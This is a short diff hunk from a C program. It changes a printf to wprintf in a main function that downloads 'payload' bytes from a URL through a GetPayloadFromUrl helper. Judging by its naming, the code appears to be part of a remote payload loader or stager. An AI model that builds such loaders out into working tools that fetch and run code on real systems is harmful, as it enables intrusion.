@@ -161,7 +161,7 @@ int main(int argc, char **argv) {
     PBYTE pPayloadBytes = NULL;
     SIZE_T sPayloadSize = 0;
 
-    printf("[*] Getting Payload from %s\n", url);
+    wprintf(L"[*] Getting Payload from %ls\n", url);
     if (!GetPayloadFromUrl(url, &pPayloadBytes, &sPayloadSize)) {
         printf("[-] Failed to get payload\n");
         return -1;
